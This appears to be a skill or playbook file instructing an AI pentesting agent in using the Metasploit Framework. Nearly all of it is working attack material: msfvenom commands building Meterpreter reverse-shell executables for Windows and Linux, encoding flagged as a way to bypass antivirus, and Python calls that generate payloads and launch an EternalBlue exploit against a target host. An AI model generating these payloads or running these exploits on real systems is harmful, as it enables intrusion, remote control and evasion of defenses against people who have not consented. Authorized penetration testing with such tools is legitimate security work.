---
name: metasploit
description: Metasploit Framework integration for payload generation and module search
---

# Metasploit Playbook

## Installation

```bash
apt-get install metasploit-framework
```

## Module Search

### Search by service
```bash
msfconsole -q -n -x "search type:exploit apache; quit"
```

### Search by CVE
```bash
msfconsole -q -n -x "search type:exploit CVE-2021-41773; quit"
```

## Payload Generation (msfvenom)

### Windows Meterpreter
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
```

### Linux Meterpreter
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf
```

### With Encoding (bypass AV)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  -e shikata_ga_nai -i 3 -f exe -o payload.exe
```

## Usage in Agents

### Search Modules
```python
from strix.tools.exploit_intelligence import MetasploitClient

client = MetasploitClient()
modules = client.search_by_service("Apache", "2.4.49")

for module in modules:
    print(f"{module['path']}: {module['name']}")
```

### Generate Payload
```python
payload = client.generate_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    format="exe",
    lhost="192.168.1.100",
    lport=4444,
    encoder="shikata_ga_nai"
)

if payload:
    with open("/tmp/shell.exe", "wb") as f:
        f.write(payload.content)
```

### Create & Run Resource Script
```python
script = client.create_resource_script(
    exploit_path="exploit/windows/smb/ms17_010_eternalblue",
    options={"RHOSTS": "192.168.1.50", "LHOST": "192.168.1.100"},
    payload_type="windows/meterpreter/reverse_tcp"
)

success, output = client.run_resource_script(script)
```

## When to Use

- Payload generation for custom reverse shells
- Module search when specific exploits needed
- Staged payload delivery
- Encoding for signature detection bypass
- Post-exploitation via Meterpreter sessions
